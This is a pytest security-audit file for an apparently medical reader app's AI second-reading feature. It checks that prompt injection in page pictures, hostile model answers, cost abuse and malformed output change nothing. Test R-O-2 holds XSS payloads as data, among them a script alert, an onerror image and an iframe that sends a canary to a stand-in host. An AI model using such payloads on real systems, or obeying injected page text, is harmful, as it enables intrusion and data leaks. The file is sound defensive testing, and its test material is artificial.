"""Audit step 14 (AI, LLM, prompt injection), slice B Reader: T-10 second reading and the reader's handling of AI
suggestions. Ids: R-P injection, R-E exfiltration and spend, R-O output validation, R-I integrity across sources.

The model is a scripted fake. An "injection succeeded" case is modelled as the hostile ANSWER a steered model would
give; each test then looks at what the server sends, stores, shows and does. Synthetic text only; nothing here is
a real record, and no test prints page text.

AI tasks in this slice (the whole list):

- T-10 second reading: model role sonnet (vision); prompt `reader/prompts/t10.txt`, version 2026-10-31.1. Schema free
  text: `lines[].text` (300 characters at most, 200 lines at most) and `confidence` (0 to 1); no other keys. Input: one
  page picture with every identifier painted black, no text. Code checks: `mask.mask_page` (fails closed),
  `kit.run_image` (sealed picture only), the schema (one retry), the cost guard; the lines are stored sealed and are
  never facts.
- T-07b re-run on the expert's typing: slice A's job, queued by `PUT /pages/{n}/transcription` through
  `extract_page_text`; slice A's prompt and provenance check. Slice B stores the typing sealed and queues the job.

Routes checked for the blind read (rule 3): GET facts, GET words, POST verify (correct, edit, not_right), POST move,
GET second-reading. By design not gated (they carry no suggestion): transcript entries (printed lines), search
(OCR words, counts and boxes only), page detail, flag-point (acts on an already checked fact).
"""

from __future__ import annotations

import copy
import io
import json
import logging
import re
import uuid
from collections.abc import AsyncIterator
from pathlib import Path
from typing import Any

import httpx
import psycopg
import pytest
from fastapi import FastAPI
from PIL import Image

from app.core.ai.kit import AiKit
from app.core.contracts.document_words import page_pdf_path, word_purpose
from app.core.contracts.facts import citable_facts
from app.core.crypto import CaseCrypto, LocalKeyProvider
from app.core.db import Database
from app.core.errors import ProcessingPaused
from app.core.http import etag
from app.core.jobs import JobContext
from app.core.packs import default_library
from app.core.storage import CaseFileStorage
from app.features.reader import router as reader_router
from app.features.reader import second_reading
from app.features.reader.schemas import PageDetail, TranscriptEntryOut
from app.features.reader.second_reading_routes import SecondReadingLine, SecondReadingOut
from tests.fixtures.stub_facts import load_stub_facts
from tests.support.ai import ScriptedBedrock, cell, response
from tests.support.ai_audit import PACK, FakeConn
from tests.support.ai_injection import CANARY, INJECTIONS
from tests.support.files import build_app, local_storage
from tests.support.identity import NAME, leaked, record_identity
from tests.support.packs import LAUNCH
from tests.support.seed import Seed

pytestmark = pytest.mark.anyio

DPI = 150
WIDTH_IN, HEIGHT_IN = 10.0, 2.0
LINES = {"lines": [{"text": "Seen today chest clear", "confidence": 0.7}]}
REPO_ROOT = Path(__file__).resolve().parents[3]


# --- fixtures (the second-reading world: pages with pictures, words and a case with every role) ---


@pytest.fixture
async def worker_db(worker_dsn: str) -> AsyncIterator[Database]:
    database = Database(worker_dsn, max_size=2)
    await database.open()
    try:
        yield database
    finally:
        await database.close()


@pytest.fixture
async def storage(auth_env: dict[str, str]) -> AsyncIterator[CaseFileStorage]:
    store = await local_storage(auth_env)
    try:
        yield store
    finally:
        await store.aclose()


@pytest.fixture
def crypto() -> CaseCrypto:
    return CaseCrypto(LocalKeyProvider.generate())


@pytest.fixture
def model() -> ScriptedBedrock:
    return ScriptedBedrock([response(LINES, 800, 20)])


@pytest.fixture(autouse=True)
def services(
    monkeypatch: pytest.MonkeyPatch, storage: CaseFileStorage, crypto: CaseCrypto, model: ScriptedBedrock
) -> None:
    monkeypatch.setattr(second_reading.services, "storage", storage)
    monkeypatch.setattr(second_reading.services, "crypto", crypto)
    monkeypatch.setattr(second_reading.services, "kit", AiKit(cell(), model))
    monkeypatch.setattr(second_reading.services, "packs", default_library())
    monkeypatch.setattr(second_reading.services, "ocr", None)


@pytest.fixture
def app(api_db: Database, auth_env: dict[str, str], storage: CaseFileStorage, crypto: CaseCrypto) -> FastAPI:
    return build_app(api_db, auth_env, storage=storage, crypto=crypto)


@pytest.fixture
async def aconn(admin_dsn: str) -> AsyncIterator[psycopg.AsyncConnection]:
    async with await psycopg.AsyncConnection.connect(admin_dsn, autocommit=True) as c:
        yield c


@pytest.fixture
def world(seed: Seed) -> dict[str, Any]:
    expert, assistant, co_expert, supervisor, viewer, stranger, org_admin = (seed.person() for _ in range(7))
    org = seed.org(members={expert: "owner", org_admin: "admin"})
    case = seed.case(org, expert, packs=LAUNCH.case_row(), status="active")
    for person, role in (
        (assistant, "assistant"),
        (co_expert, "co_expert"),
        (supervisor, "supervisor"),
        (viewer, "viewer"),
    ):
        seed.case_member(case, person, role, added_by=expert)
    other = seed.case(seed.org(members={stranger: "owner"}), stranger, packs=LAUNCH.case_row(), status="active")
    return {
        "case": case,
        "other_case": other,
        "expert": expert,
        "assistant": assistant,
        "co_expert": co_expert,
        "supervisor": supervisor,
        "viewer": viewer,
        "stranger": stranger,
        "org_admin": org_admin,
    }


def sr(case: uuid.UUID, no: int = 1, tail: str = "") -> str:
    return f"/v1/cases/{case}/pages/{no}/second-reading{tail}"


def _box(x: float, text: str) -> tuple[float, ...]:
    w = 0.06 * len(text)
    return (x, 0.5, x + w, 0.5, x + w, 0.7, x, 0.7)


async def add_page(
    aconn: psycopg.AsyncConnection,
    storage: CaseFileStorage,
    crypto: CaseCrypto,
    case: uuid.UUID,
    no: int,
    texts: list[str],
    *,
    colour: Any = "white",
    typed: bool = False,
) -> uuid.UUID:
    """A handwriting page number `no` with a picture of one colour and OCR words (all unreadable, none typed)."""
    doc, page = uuid.uuid4(), uuid.uuid4()
    await aconn.execute(
        "insert into app.documents (id, bundle_id, kind, filename, sha256)"
        " values (%s, (select bundle_id from app.cases where id = %s), 'records', 'f.pdf', %s)",
        (doc, case, "0" * 64),
    )
    path = f"cases/{case}/pages/{page}/image.jpg"
    image = io.BytesIO()
    Image.new("RGB", (int(WIDTH_IN * DPI), int(HEIGHT_IN * DPI)), colour).save(image, format="JPEG", quality=95)
    await storage.put(path, await crypto.encrypt(aconn, case, image.getvalue(), purpose=path))
    pdf = page_pdf_path(case, page)
    await storage.put(pdf, await crypto.encrypt(aconn, case, b"%PDF stand-in", purpose=pdf))
    await aconn.execute(
        "insert into app.pages (id, bundle_id, document_id, bundle_page_no, image_path, handwriting, unreadable,"
        " transcribed_by_expert_text)"
        " values (%s, (select bundle_id from app.cases where id = %s), %s, %s, %s, true, true, %s)",
        (page, case, doc, no, path, b"sealed" if typed else None),
    )
    await aconn.execute(
        "insert into app.page_analysis (page_id, bundle_id, width, height)"
        " values (%s, (select bundle_id from app.cases where id = %s), %s, %s)",
        (page, case, WIDTH_IN, HEIGHT_IN),
    )
    x = 0.1
    for n, text in enumerate(texts, start=1):
        wid = f"p{no}w{n}"
        sealed = await crypto.encrypt(aconn, case, text.encode(), purpose=word_purpose(page, wid))
        await aconn.execute(
            "insert into app.ocr_words (page_id, bundle_id, n, word_id, text, polygon, confidence, source)"
            " values (%s, (select bundle_id from app.cases where id = %s), %s, %s, %s, %s::real[], 0.9, 'ocr')",
            (page, case, n, wid, sealed, list(_box(x, text))),
        )
        x += 0.06 * len(text) + 0.1
    return page


async def named_page(
    aconn: psycopg.AsyncConnection,
    storage: CaseFileStorage,
    crypto: CaseCrypto,
    case: uuid.UUID,
    no: int = 1,
    extra: list[str] | None = None,
    **kwargs: Any,
) -> uuid.UUID:
    """A page whose words include the case's recorded name, so there is something to mask."""
    await record_identity(aconn, crypto, case)
    first, last = NAME.split()
    return await add_page(aconn, storage, crypto, case, no, [first, last, *(extra or ["Seen"])], **kwargs)


async def run_job(worker_db: Database, admin: psycopg.Connection, case: uuid.UUID, job: str) -> None:
    admin.execute("update app.jobs set status = 'running' where id = %s", (job,))
    await second_reading.second_reading(JobContext(worker_db, uuid.UUID(job), case, "second_reading", 1))


async def ask(client: httpx.AsyncClient, case: uuid.UUID, no: int = 1) -> str:
    resp = await client.post(sr(case, no, "?on_request=true"))
    assert resp.status_code == 202, resp.text
    return str(resp.json()["job_id"])


def snapshot(admin: psycopg.Connection, case: uuid.UUID, page: uuid.UUID) -> dict[str, Any]:
    """Everything the reader's record holds about the page, outside the second-reading row itself."""

    def one(sql: str, *args: Any) -> Any:
        row = admin.execute(sql, args).fetchone()
        assert row is not None
        return row[0] if len(row) == 1 else tuple(row)

    return {
        "facts": one("select count(*) from app.facts where case_id = %s", case),
        "verifications": one("select count(*) from app.fact_verifications where case_id = %s", case),
        "words": one("select count(*) from app.ocr_words where page_id = %s", page),
        "reads": one("select count(*) from app.page_reads where case_id = %s", case),
        "page": one(
            "select unreadable, handwriting, relevance, needs_clearer_copy, transcribed_by_expert_text, rotation,"
            " quarantined, duplicate_of_page_id from app.pages where id = %s",
            page,
        ),
    }


def stored_status(admin: psycopg.Connection, page: uuid.UUID) -> tuple[Any, ...]:
    row = admin.execute("select status, reason, lines from app.second_readings where page_id = %s", (page,)).fetchone()
    assert row is not None
    return tuple(row)


# --- R-P: injection (request side) ---


async def test_r_p_1_only_a_genuine_masked_picture_reaches_the_model(
    client_for: Any,
    worker_db: Database,
    admin: psycopg.Connection,
    aconn: psycopg.AsyncConnection,
    storage: CaseFileStorage,
    crypto: CaseCrypto,
    model: ScriptedBedrock,
    world: dict[str, Any],
) -> None:
    await named_page(aconn, storage, crypto, world["case"])
    client = await client_for(world["expert"])
    await run_job(worker_db, admin, world["case"], await ask(client, world["case"]))
    [sent] = model.requests
    genuine = sent.image
    assert genuine is not None and genuine.masked_words >= 2  # the job's own picture: control

    seen: list[Any] = []
    fake = ScriptedBedrock([response(LINES)])
    kit = AiKit(cell(), fake)
    for refused in (
        b"\xff\xd8 raw picture bytes",  # raw bytes
        Image.new("RGB", (8, 8)).tobytes(),
    ):
        raw: Any = refused
        with pytest.raises(TypeError):
            await kit.run_image(FakeConn(), second_reading.TASK, raw, pack=PACK, case_id=world["case"])
    forged = copy.copy(genuine)  # a picture swapped after sealing: the hash and the seal no longer agree
    object.__setattr__(forged, "data", b"\xff\xd8 another picture")
    with pytest.raises(TypeError):
        await kit.run_image(FakeConn(), second_reading.TASK, forged, pack=PACK, case_id=world["case"])
    assert fake.requests == [], "nothing was sent for a raw or a swapped picture"

    out = await kit.run_image(FakeConn(), second_reading.TASK, genuine, pack=PACK, case_id=world["case"])  # control
    assert out == LINES and len(fake.requests) == 1 and fake.requests[0].image is genuine
    assert seen == []


@pytest.mark.parametrize("key", sorted(INJECTIONS))
async def test_r_p_2_a_hostile_picture_and_a_hostile_answer_change_nothing(
    key: str,
    client_for: Any,
    worker_db: Database,
    admin: psycopg.Connection,
    aconn: psycopg.AsyncConnection,
    storage: CaseFileStorage,
    crypto: CaseCrypto,
    model: ScriptedBedrock,
    world: dict[str, Any],
    caplog: pytest.LogCaptureFixture,
) -> None:
    """The picture's own words are the hostile sentence (as OCR read them) and the model obeys it in its answer."""
    hostile = INJECTIONS[key]
    model.script[:] = [response({"lines": [{"text": hostile, "confidence": 0.9}]}, 800, 20)]
    case = world["case"]
    page = await named_page(aconn, storage, crypto, case, extra=hostile.split())
    client = await client_for(world["expert"])
    before = snapshot(admin, case, page)
    caplog.set_level(logging.DEBUG)
    await run_job(worker_db, admin, case, await ask(client, case))

    [sent] = model.requests
    assert sent.text == "", "no page text travels with the picture"
    assert sent.system == second_reading.TASK.system and dict(sent.schema) == second_reading.TASK.schema
    assert sent.temperature == 0 and sent.image is not None
    sent_text = [sent.system, sent.text, json.dumps(dict(sent.context), default=str), json.dumps(dict(sent.schema))]
    assert not any(CANARY in part for part in sent_text), "words seen in the picture never reach the prompt"
    assert leaked(sent_text) == []

    body = (await client.get(sr(case))).json()
    assert body == {
        "status": "done",
        "reason": None,
        "lines": [{"text": hostile, "confidence": 0.9}],
        "source": "machine_read",  # step 14 R-O-5: the marker and its provenance grew the answer
        "prompt_version": second_reading.TASK.prompt_version,
        "read_at": body["read_at"],
    }
    assert snapshot(admin, case, page) == before, "the reader's record is untouched by what the model said"
    jobs = admin.execute("select count(*) from app.jobs where case_id = %s", (case,)).fetchone()
    assert jobs == (1,), "the answer queued no further work"
    assert admin.execute("select status from app.cases where id = %s", (case,)).fetchone() == ("active",)
    actions = {r[0] for r in admin.execute("select action from app.audit_log where case_id = %s", (case,)).fetchall()}
    assert actions <= {"page.second_reading_requested"}
    calls = admin.execute("select row_to_json(c)::text from app.ai_calls c where case_id = %s", (case,)).fetchall()
    assert len(calls) == 1 and CANARY not in calls[0][0], "the call log carries no content"
    assert CANARY not in caplog.text and hostile not in caplog.text, "rule 6: no page text in the logs"


async def test_r_p_3_only_the_asked_page_of_the_asked_case_is_sent(
    client_for: Any,
    worker_db: Database,
    admin: psycopg.Connection,
    aconn: psycopg.AsyncConnection,
    storage: CaseFileStorage,
    crypto: CaseCrypto,
    model: ScriptedBedrock,
    world: dict[str, Any],
) -> None:
    case = world["case"]
    await named_page(aconn, storage, crypto, case, 1, colour=(255, 255, 255))
    await add_page(aconn, storage, crypto, case, 2, ["Seen"], colour=(200, 30, 30))
    await named_page(aconn, storage, crypto, world["other_case"], 1, colour=(30, 200, 30))
    stranger = await client_for(world["stranger"])
    await ask(stranger, world["other_case"])  # a second case has a page waiting too
    client = await client_for(world["expert"])
    await run_job(worker_db, admin, case, await ask(client, case, 1))

    def corner(sent: Any) -> tuple[int, ...]:
        return tuple(Image.open(io.BytesIO(sent.image.data)).convert("RGB").getpixel((3, 3)))  # type: ignore[arg-type]

    [sent] = model.requests
    assert all(c > 240 for c in corner(sent)), "page 1 (white) was sent, not page 2 or the other case's page"
    waiting = admin.execute(
        "select count(*) from app.second_readings where case_id = %s and status = 'queued'", (world["other_case"],)
    ).fetchone()
    assert waiting == (1,), "the other case's request was not touched by this case's job"
    assert admin.execute("select count(*) from app.second_readings where case_id = %s", (case,)).fetchone() == (1,)

    await run_job(worker_db, admin, case, await ask(client, case, 2))  # control: asking page 2 sends page 2
    red = corner(model.requests[-1])
    assert red[0] > 150 and red[1] < 90 and red[2] < 90 and len(model.requests) == 2


async def test_r_p_4_who_may_ask_and_see(
    client_for: Any,
    admin: psycopg.Connection,
    aconn: psycopg.AsyncConnection,
    storage: CaseFileStorage,
    crypto: CaseCrypto,
    world: dict[str, Any],
) -> None:
    case = world["case"]
    await named_page(aconn, storage, crypto, case)
    allowed = ("expert", "assistant")
    for who in ("viewer", "co_expert", "supervisor"):
        client = await client_for(world[who])
        assert (await client.post(sr(case, 1, "?on_request=true"))).status_code == 403, who
        assert (await client.get(sr(case))).status_code == 403, who
    for who in ("stranger", "org_admin"):
        client = await client_for(world[who])
        assert (await client.post(sr(case, 1, "?on_request=true"))).status_code in (403, 404), who
        assert (await client.get(sr(case))).status_code in (403, 404), who
    stranger = await client_for(world["stranger"])
    assert (await stranger.post(sr(case, 1, "?on_request=true"))).status_code == 404
    jobs = admin.execute("select count(*) from app.jobs where case_id = %s and kind = 'second_reading'", (case,))
    assert jobs.fetchone() == (0,), "every refused ask left nothing queued"
    for who in allowed:  # control: the named expert and their assistant may
        client = await client_for(world[who])
        assert (await client.post(sr(case, 1, "?on_request=true"))).status_code == 202, who
        assert (await client.get(sr(case))).status_code == 200, who
    jobs = admin.execute("select count(*) from app.jobs where case_id = %s and kind = 'second_reading'", (case,))
    assert jobs.fetchone() == (1,), "the assistant's ask while one is waiting queued nothing more (step 14 R-E-2)"


async def test_r_p_5_asking_queues_a_job_and_sends_nothing_in_the_request(
    client_for: Any,
    admin: psycopg.Connection,
    aconn: psycopg.AsyncConnection,
    storage: CaseFileStorage,
    crypto: CaseCrypto,
    model: ScriptedBedrock,
    world: dict[str, Any],
) -> None:
    case = world["case"]
    page = await named_page(aconn, storage, crypto, case)
    client = await client_for(world["expert"])
    job = await ask(client, case)
    assert model.requests == [], "the model is never called inside a request"
    row = admin.execute("select kind, status from app.jobs where id = %s", (job,)).fetchone()
    assert row == ("second_reading", "queued")
    assert stored_status(admin, page)[0] == "queued"


# --- R-E: exfiltration and spend ---


async def test_r_e_1_the_cost_guard_stops_a_job_over_its_allowance(
    client_for: Any,
    worker_db: Database,
    admin: psycopg.Connection,
    aconn: psycopg.AsyncConnection,
    storage: CaseFileStorage,
    crypto: CaseCrypto,
    model: ScriptedBedrock,
    world: dict[str, Any],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    tight = cell(AI_COST_GUARD_MULTIPLE="1", AI_EXPECTED_TOKENS_PER_PAGE="1", AI_MIN_EXPECTED_PAGES="1")
    monkeypatch.setattr(second_reading.services, "kit", AiKit(tight, model))
    case = world["case"]
    page = await named_page(aconn, storage, crypto, case)
    client = await client_for(world["expert"])
    await run_job(worker_db, admin, case, await ask(client, case))  # control: under the allowance it runs
    assert stored_status(admin, page)[0] == "done" and len(model.requests) == 1

    # asking again for a finished page queues nothing (step 14 R-E-2), so queue the page again as the job sees it
    admin.execute("update app.second_readings set status = 'queued', lines = null where page_id = %s", (page,))
    again = admin.execute(
        "insert into app.jobs (case_id, kind) values (%s, 'second_reading') returning id", (case,)
    ).fetchone()
    assert again is not None
    with pytest.raises(ProcessingPaused) as paused:
        await run_job(worker_db, admin, case, str(again[0]))
    assert paused.value.reason == "cost_guard"
    assert len(model.requests) == 1, "no second model call once the case is over its allowance"
    assert (await client.get(sr(case))).json()["status"] == "queued"
    assert admin.execute("select count(*) from app.ai_calls where case_id = %s", (case,)).fetchone() == (1,)


async def test_r_e_2_asking_again_while_one_is_waiting_does_not_queue_another_job(
    client_for: Any,
    admin: psycopg.Connection,
    aconn: psycopg.AsyncConnection,
    storage: CaseFileStorage,
    crypto: CaseCrypto,
    world: dict[str, Any],
) -> None:
    case = world["case"]
    await named_page(aconn, storage, crypto, case)
    client = await client_for(world["assistant"])
    for _ in range(25):
        assert (await client.post(sr(case, 1, "?on_request=true"))).status_code in (202, 429)
    queued = admin.execute(
        "select count(*) from app.jobs where case_id = %s and kind = 'second_reading' and status = 'queued'", (case,)
    ).fetchone()
    assert queued is not None and queued[0] <= 1


def jobs_of(admin: psycopg.Connection, case: uuid.UUID) -> int:
    row = admin.execute(
        "select count(*) from app.jobs where case_id = %s and kind = 'second_reading'", (case,)
    ).fetchone()
    assert row is not None
    return int(row[0])


async def test_r_e_2_a_repeat_ask_for_an_unchanged_page_returns_its_own_reading_and_calls_no_model(
    client_for: Any,
    worker_db: Database,
    admin: psycopg.Connection,
    aconn: psycopg.AsyncConnection,
    storage: CaseFileStorage,
    crypto: CaseCrypto,
    model: ScriptedBedrock,
    world: dict[str, Any],
) -> None:
    case = world["case"]
    page_one = await named_page(aconn, storage, crypto, case, 1)
    await named_page(aconn, storage, crypto, case, 2)
    client = await client_for(world["expert"])
    first = await ask(client, case, 1)
    await run_job(worker_db, admin, case, first)
    admin.execute("update app.jobs set status = 'done' where id = %s", (first,))
    assert stored_status(admin, page_one)[0] == "done" and len(model.requests) == 1  # control: it did read once
    second_page_job = await ask(client, case, 2)  # a newer job, for another page
    assert second_page_job != first
    before = jobs_of(admin, case)

    # the same page, same turn, same picture: the reading it already has, never the newest job of the case
    assert await ask(client, case, 1) == first
    assert await ask(client, case, 1) == first
    assert await ask(client, case, 2) == second_page_job  # a waiting page answers with its own job too
    assert jobs_of(admin, case) == before and len(model.requests) == 1


@pytest.mark.parametrize("change", ["turned", "redrawn"])
async def test_r_e_2_a_turned_or_redrawn_page_can_be_read_again(
    change: str,
    client_for: Any,
    worker_db: Database,
    admin: psycopg.Connection,
    aconn: psycopg.AsyncConnection,
    storage: CaseFileStorage,
    crypto: CaseCrypto,
    model: ScriptedBedrock,
    world: dict[str, Any],
) -> None:
    case = world["case"]
    page = await named_page(aconn, storage, crypto, case)
    client = await client_for(world["expert"])
    first = await ask(client, case)
    await run_job(worker_db, admin, case, first)
    admin.execute("update app.jobs set status = 'done' where id = %s", (first,))
    assert await ask(client, case) == first  # control: unchanged, so the same reading

    if change == "turned":
        admin.execute("update app.pages set rotation = 90 where id = %s", (page,))
    else:
        path = f"cases/{case}/pages/{page}/image.jpg"
        picture = io.BytesIO()
        Image.new("RGB", (int(WIDTH_IN * DPI), int(HEIGHT_IN * DPI)), "black").save(picture, format="JPEG", quality=95)
        await storage.put(path, await crypto.encrypt(aconn, case, picture.getvalue(), purpose=path))
    again = await ask(client, case)
    assert again != first and jobs_of(admin, case) == 2
    row = admin.execute("select status, page_rotation from app.second_readings where page_id = %s", (page,)).fetchone()
    assert row == ("queued", 90 if change == "turned" else 0)
    assert await ask(client, case) == again  # still one at a time: asking again while it waits queues nothing
    assert jobs_of(admin, case) == 2


# --- R-O: output validation ---

_LINE = {"text": "a", "confidence": 0.5}
BAD_ANSWERS: dict[str, dict[str, Any]] = {
    "text_over_300": {"lines": [{"text": "a" * 301, "confidence": 0.5}]},
    "over_200_lines": {"lines": [_LINE] * 201},
    "confidence_over_1": {"lines": [{"text": "a", "confidence": 1.5}]},
    "confidence_under_0": {"lines": [{"text": "a", "confidence": -0.1}]},
    "extra_top_key": {"lines": [_LINE], "opinion": f"The care was negligent. {CANARY}"},
    "extra_line_key": {"lines": [{"text": "a", "confidence": 0.5, "word_ids": ["w1"], "page": 999}]},
    "missing_confidence": {"lines": [{"text": "a"}]},
    "text_not_a_string": {"lines": [{"text": ["a"], "confidence": 0.5}]},
    "no_lines": {"opinion": CANARY},
}


@pytest.mark.parametrize("name", sorted(BAD_ANSWERS))
async def test_r_o_1_an_answer_outside_the_schema_is_failed_and_stores_nothing(
    name: str,
    client_for: Any,
    worker_db: Database,
    admin: psycopg.Connection,
    aconn: psycopg.AsyncConnection,
    storage: CaseFileStorage,
    crypto: CaseCrypto,
    model: ScriptedBedrock,
    world: dict[str, Any],
) -> None:
    model.script[:] = [response(BAD_ANSWERS[name])]
    case = world["case"]
    page = await named_page(aconn, storage, crypto, case)
    client = await client_for(world["expert"])
    before = snapshot(admin, case, page)
    await run_job(worker_db, admin, case, await ask(client, case))
    assert len(model.requests) == 2, "one retry, then given up"
    assert stored_status(admin, page) == ("failed", "invalid_output", None)
    assert (await client.get(sr(case))).json() == {"status": "failed", "reason": "invalid_output", "lines": []}
    assert snapshot(admin, case, page) == before


async def test_r_o_1_control_answers_exactly_at_the_bounds_are_kept(
    client_for: Any,
    worker_db: Database,
    admin: psycopg.Connection,
    aconn: psycopg.AsyncConnection,
    storage: CaseFileStorage,
    crypto: CaseCrypto,
    model: ScriptedBedrock,
    world: dict[str, Any],
) -> None:
    lines = [{"text": "a" * 300, "confidence": 1.0}] + [{"text": "b", "confidence": 0.0}] * 199
    model.script[:] = [response({"lines": lines})]
    case = world["case"]
    await named_page(aconn, storage, crypto, case)
    client = await client_for(world["expert"])
    await run_job(worker_db, admin, case, await ask(client, case))
    body = (await client.get(sr(case))).json()
    assert body["status"] == "done" and body["lines"] == lines and len(model.requests) == 1


async def test_r_o_2_markup_comes_back_as_plain_json_text_and_is_stored_sealed(
    client_for: Any,
    worker_db: Database,
    admin: psycopg.Connection,
    aconn: psycopg.AsyncConnection,
    storage: CaseFileStorage,
    crypto: CaseCrypto,
    model: ScriptedBedrock,
    world: dict[str, Any],
) -> None:
    payloads = [
        "<script>alert(1)</script>",
        "**bold** [click](javascript:alert(1)) # heading",
        '<img src=x onerror="alert(1)">',
        f"</pre><iframe src=//example.invalid/{CANARY}>",
    ]
    model.script[:] = [response({"lines": [{"text": p, "confidence": 0.5} for p in payloads]})]
    case = world["case"]
    page = await named_page(aconn, storage, crypto, case)
    client = await client_for(world["expert"])
    await run_job(worker_db, admin, case, await ask(client, case))
    resp = await client.get(sr(case))
    assert resp.headers["content-type"].startswith("application/json")
    assert [ln["text"] for ln in resp.json()["lines"]] == payloads, "verbatim data, not rewritten or stripped"
    sealed = bytes(stored_status(admin, page)[2])
    assert b"script" not in sealed and CANARY.encode() not in sealed


_RENDERS_MARKUP = re.compile(
    r"dangerouslySetInnerHTML|\.innerHTML|insertAdjacentHTML|outerHTML|document\.write|[Mm]arkdown"
    r"|from ['\"](marked|showdown|snarkdown|remark[\w-]*|rehype[\w-]*|micromark|markdown-it)['\"]"
)


def _renders_markup(root: Path) -> list[str]:
    return sorted(
        str(p.relative_to(root))
        for p in root.rglob("*")
        if p.suffix in (".ts", ".tsx", ".js", ".jsx") and _RENDERS_MARKUP.search(p.read_text())
    )


async def test_r_o_2_the_reader_screens_never_render_html_or_markdown(tmp_path: Path) -> None:
    web = REPO_ROOT / "web/src/capabilities/reader"
    assert len(list(web.rglob("*.tsx"))) > 5, "the folder is the real one"
    shown = (web / "SecondReading.tsx").read_text()
    assert "{line.text}" in shown, "the lines are shown as React text"
    assert _renders_markup(web) == []
    (tmp_path / "bad.tsx").write_text("<div dangerouslySetInnerHTML={{ __html: x }} />")
    (tmp_path / "md.ts").write_text("import { marked } from 'marked'")
    assert _renders_markup(tmp_path) == ["bad.tsx", "md.ts"], "control: the scan does find them"


async def test_r_o_3_a_reading_is_never_a_fact_a_word_a_read_or_a_way_out_of_the_queue(
    client_for: Any,
    worker_db: Database,
    admin: psycopg.Connection,
    aconn: psycopg.AsyncConnection,
    storage: CaseFileStorage,
    crypto: CaseCrypto,
    model: ScriptedBedrock,
    world: dict[str, Any],
    app: FastAPI,
) -> None:
    steer = INJECTIONS["steer_classification"]
    model.script[:] = [
        response({"lines": [{"text": steer, "confidence": 1.0}, {"text": "Seen chest clear", "confidence": 1.0}]})
    ]
    case = world["case"]
    page = await named_page(aconn, storage, crypto, case)
    client = await client_for(world["expert"])
    queue = (await client.get(f"/v1/cases/{case}/pages/unreadable")).json()
    assert [(p["page_no"], p["done"], p["has_transcription"]) for p in queue["pages"]] == [(1, False, False)]
    before = snapshot(admin, case, page)

    await run_job(worker_db, admin, case, await ask(client, case))
    assert (await client.get(sr(case))).json()["status"] == "done"
    assert snapshot(admin, case, page) == before
    assert before["facts"] == 0 and before["verifications"] == 0 and before["reads"] == 0
    after = (await client.get(f"/v1/cases/{case}/pages/unreadable")).json()
    assert after == queue, "the page is still in the couldn't-read queue, not done"
    detail = (await client.get(f"/v1/cases/{case}/pages/1")).json()
    assert detail["has_transcription"] is False and detail["handwriting"] is True and detail["relevance"] is None
    assert await citable_facts(aconn, case, app.state.page_reads) == []
    assert admin.execute(
        "select count(*) from app.facts where case_id = %s and status <> 'suggested'", (case,)
    ).fetchone() == (0,)


async def test_r_o_4_the_answer_has_no_word_ids_pages_or_fact_fields_so_it_cannot_pass_for_a_cited_fact() -> None:
    """There are no OCR word ids to check the model's copy against (provenance cannot apply): what the server does
    instead is keep the copy out of every field a fact or a citation uses."""
    assert set(SecondReadingOut.model_fields) == {
        "status",
        "reason",
        "lines",
        "source",
        "prompt_version",
        "read_at",
    }
    assert set(SecondReadingLine.model_fields) == {"text", "confidence"}
    assert second_reading.TASK.schema["additionalProperties"] is False
    line = second_reading.TASK.schema["properties"]["lines"]["items"]
    assert set(line["properties"]) == {"text", "confidence"} and line["additionalProperties"] is False
    assert "opinion" not in second_reading.TASK.system.lower().replace("no opinion", "").replace("any opinion", "")
    assert "never guess" in second_reading.TASK.system.lower()


async def test_r_o_5_the_answer_says_the_lines_are_machine_read(
    client_for: Any,
    worker_db: Database,
    admin: psycopg.Connection,
    aconn: psycopg.AsyncConnection,
    storage: CaseFileStorage,
    crypto: CaseCrypto,
    world: dict[str, Any],
) -> None:
    case = world["case"]
    await named_page(aconn, storage, crypto, case)
    client = await client_for(world["expert"])
    await run_job(worker_db, admin, case, await ask(client, case))
    body = (await client.get(sr(case))).json()
    assert body["status"] == "done"
    assert {"source", "origin", "read_by", "model", "prompt_version"} & set(body), sorted(body)


async def test_r_i_5b_the_second_reading_get_is_by_design_not_behind_the_blind_read_and_has_limits(
    client_for: Any,
    worker_db: Database,
    admin: psycopg.Connection,
    aconn: psycopg.AsyncConnection,
    storage: CaseFileStorage,
    crypto: CaseCrypto,
    world: dict[str, Any],
) -> None:
    """ADR 0030 (reviewed in audit step 14): the second reading is for a page the expert cannot read, so it is
    not behind the blind read. Its limits: it needs `page.transcribe`, it exists only for a page the expert asked
    about, its lines never become facts, and the facts route stays 423 until the page is recorded read."""
    case = world["case"]
    await named_page(aconn, storage, crypto, case)
    await add_page(aconn, storage, crypto, case, 2, ["Other"])
    client = await client_for(world["expert"])
    await run_job(worker_db, admin, case, await ask(client, case))
    shown = await client.get(sr(case))
    assert shown.status_code == 200 and shown.json()["status"] == "done"  # not read yet, still shown
    untouched = (await client.get(sr(case, 2))).json()
    assert untouched["status"] == "none" and untouched["lines"] == [], "a page nobody asked about shows nothing"
    assert (await client.get(f"/v1/cases/{case}/pages/1/facts")).status_code == 423
    assert admin.execute("select count(*) from app.facts where case_id = %s", (case,)).fetchone() == (0,)
    for who in ("viewer", "co_expert", "supervisor"):
        assert (await (await client_for(world[who])).get(sr(case))).status_code == 403, who


async def test_r_o_6_the_experts_typing_is_stored_sealed_and_makes_no_model_call_in_the_request(
    client_for: Any,
    admin: psycopg.Connection,
    aconn: psycopg.AsyncConnection,
    storage: CaseFileStorage,
    crypto: CaseCrypto,
    model: ScriptedBedrock,
    world: dict[str, Any],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The T-07b re-run on the typing is slice A's job (`extract_page_text`); slice B stores the text and queues it."""
    queued: list[tuple[uuid.UUID, uuid.UUID]] = []

    async def stub(conn: Any, case_id: uuid.UUID, page_id: uuid.UUID) -> uuid.UUID:
        queued.append((case_id, page_id))
        return uuid.uuid4()

    monkeypatch.setattr(reader_router, "extract_page_text", stub)
    case = world["case"]
    page = await named_page(aconn, storage, crypto, case)
    client = await client_for(world["expert"])
    hostile = INJECTIONS["fabricate_information"]
    url = f"/v1/cases/{case}/pages/1/transcription"
    too_long = await client.put(url, json={"text": "a" * 20_001})
    assert too_long.status_code == 422 and queued == []
    resp = await client.put(url, json={"text": hostile})
    assert resp.status_code == 202 and queued == [(case, page)]
    assert model.requests == []
    stored = admin.execute("select transcribed_by_expert_text from app.pages where id = %s", (page,)).fetchone()
    assert stored is not None and CANARY.encode() not in bytes(stored[0]), "sealed with the case key"
    assert hostile not in (await client.get(f"/v1/cases/{case}/pages/1")).text, "page detail never returns the text"
